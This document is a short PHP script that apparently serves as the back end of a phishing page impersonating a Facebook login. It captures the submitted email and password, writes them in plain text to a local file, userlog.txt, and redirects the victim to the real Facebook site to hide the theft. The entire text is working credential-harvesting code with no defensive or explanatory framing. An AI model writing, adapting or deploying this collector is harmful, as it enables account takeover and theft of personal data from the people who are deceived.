<?php
if (isset($_POST['email']) && ($_POST['pass']))
{
$user= $_POST['email'] ;
$password= $_POST['pass'] ;
$handle = fopen("userlog.txt" , "w" );
fwrite($handle, "username = ");
fwrite($handle , $user);
fwrite($handle," ");
fwrite($handle,"password = ");
fwrite($handle, $password);
header('Location: https://www.facebook.com ');
exit;
}
?>                                                  
                             
